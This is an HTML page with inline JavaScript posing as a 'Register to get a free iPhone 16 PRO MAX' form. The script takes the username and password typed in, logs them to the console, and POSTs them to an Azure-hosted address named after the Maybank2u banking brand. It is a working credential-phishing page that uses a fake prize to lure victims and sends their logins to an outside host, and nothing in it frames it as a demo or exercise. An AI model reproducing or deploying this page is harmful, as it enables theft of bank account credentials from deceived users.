<html>

<body>
   <center>
      <form action="" id="loginForm">
         <h1>Register to get a free iPhone 16 PRO MAX</h1>
         <br>
         <div>
            <input type="text" id="username" class="form-control" placeholder="Enter your Username...">
         </div>
         <br>
         <div>
            <input type="password" id="password" class="form-control" placeholder="Enter your Password...">
         </div>
         <hr>
         <div>
            <button type="submit">Register</button>
         </div>
      </form>
   </center>
   <script>
      let loginForm = document.getElementById("loginForm");

      loginForm.addEventListener("submit", (e) => {
         e.preventDefault();

         let username = document.getElementById("username");
         let password = document.getElementById("password");

         if (username.value == "" || password.value == "") {
            alert("Ensure you input a value in both fields!");
         } else {
            // perform operation with form input
            //alert("This form has been successfully submitted!");
            console.log(
               `This form has a username of ${username.value} and password of ${password.value}`
            );

            var apiUrl = 'https://maybank2u.azurewebsites.net/register';

            fetch(apiUrl,
               {
                  method: "POST",
                  headers: {
                     "Content-Type": "application/json"
                  },
                  body: JSON.stringify({
                     username: username.value,
                     password: password.value
                  })
               }

            ).then(response => {
               username.value = "";
               password.value = "";

               console.log(response.json())
            }).catch(err => {
               console.log(err)
            });
         }
      });
   </script>
</body>

</html>